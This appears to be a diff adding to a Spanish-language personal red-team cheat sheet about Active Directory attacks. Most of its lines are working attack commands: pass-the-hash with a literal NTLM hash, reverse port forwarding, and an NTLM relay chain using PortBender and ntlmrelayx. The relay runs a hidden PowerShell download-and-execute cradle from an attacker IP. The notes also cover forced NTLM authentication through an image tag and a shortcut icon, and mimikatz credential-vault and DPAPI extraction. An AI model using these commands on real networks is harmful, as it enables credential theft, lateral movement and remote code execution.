@@ -391,6 +391,7 @@ Parchea LSASS requiere privilegios administrador local
 pth DEV\user ntlm
 lo carga autmaaticamente
 ls \\maquina\c$
+pth .\Administrator b423cdd3ad21718de4490d9344afef72
 
 mimikatz
 privilege::debug
@@ -486,17 +487,92 @@ ss -lpnt
 proxychains  sock4 127.0.0.1 localhost
 proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 proxychains python3 /usr/local/bin/wmiexec.py CEV/user@ip
-
 #WindowsApps
 #Broweser sock proxy
-
 #Metasploit
 setg Proxies socks4:ip:1080
-
 #runas
 runas /netonly /user:DEV\nlamb "C:\windows\system32\mmc.exe"
 
 #Reverse Port Forward
+$endpoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Any, 4444)
+$listener = New-Object System.Net.Sockets.TcpListener $endpoint
+$listener.Start()
+Write-Host "Listening on port 4444"
+while ($true)
+{
+  $client = $listener.AcceptTcpClient()
+  Write-Host "A client has connected"
+  $client.Close()
+}
+
+nativo
+netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
+netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.14.55 connectport=4444 protocol=tcp
+netsh interface portproxy show v4tov4
+Test-NetConnection -ComputerName 10.10.17.71 -Port 4444 
+netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
+listenaddress es la dirección IP para escuchar (probablemente siempre 0.0.0.0).
+listenport es el puerto para escuchar.
+connectaddress es la dirección IP de destino.
+connectport es el puerto de destino.
+protocolo a utilizar (siempre TCP).
+
+#Rportfwd
+rportfwd 8080 10.10.5.120 80
+run netstat -anp tcp
+iwr -Uri http://10.10.17.231:8080/a
+rportfwd stop 8080
+No necesita ser un administrador local para crear reenvíos de puertos inversos en puertos altos.
+
+#rportfwd_local
+python3 -m http.server --bind 127.0.0.1 8080 
+rportfwd_local 8080 127.0.0.1 8080 
+iwr -Uri http://machine:8080/test.txt
+python3 -m http.server --bind 127.0.0.1 8080
+
+#NTLM Relaying
+El cliente realiza una solicitud de autenticación a un servidor para un recurso al que desea acceder.
+El servidor envía un desafío al cliente: el cliente debe cifrar el desafío utilizando el hash de su contraseña.
+El cliente envía la respuesta cifrada al servidor, que se pone en contacto con un controlador de dominio para verificar que el desafío cifrado sea correcto.
+https://github.com/praetorian-inc/PortBender
+PortBender.cna
+7-pth .\Administrator b423cdd3ad21718de4490d9344afef72
+6-upload c:\users\administrator\Desktop\pwn.lnk
+5-PortBender redirect 445 8445
+4- Upload WinDivert64.sys c:\windows\system32
+3-rportfwd 8445 127.0.0.1 445
+2-socks 1080 
+1-proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://ip -smb2support --no-http-server --no-wcf-server
+proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://10.10.17.68 -smb2support --no-http-server --no-wcf-server -c 'powershell -nop -w hidden -c "iex (new-object net.webclient).downloadstring(\"http://10.10.17.231:8080/b\")"'
+
+jump psexec64 srv-2 smb
+jobs
+jobkill 1
+
+#OPSCE
+source = "XmlWinEventLog: Microsoft-Windows-Sysmon / Operational" EventID = 6 Signature! = "Amazon Web Services, Inc."
+
+#FORCE NTLM
+<img src="\\10.10.17.231\test.ico" height="1" width="1" />
+
+#WindowsShorcuts
+$wsh = new-object -ComObject wscript.shell
+$shortcut = $wsh.CreateShortcut("\\dc-2\software\test.lnk")
+$shortcut.IconLocation = "\\10.10.17.231\test.ico"
+$shortcut.Save()
+
+#DAPI
+Guarda datos credenciales RDP
+
+#Credential Manager
+run vaultcmd /listcreds:"Windows Credentials" /all
+mimikatz vault::list
+mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\9D54C839752B38B233E5D56FDD7891A7
+···incompleto
+
+
+
 
 
 
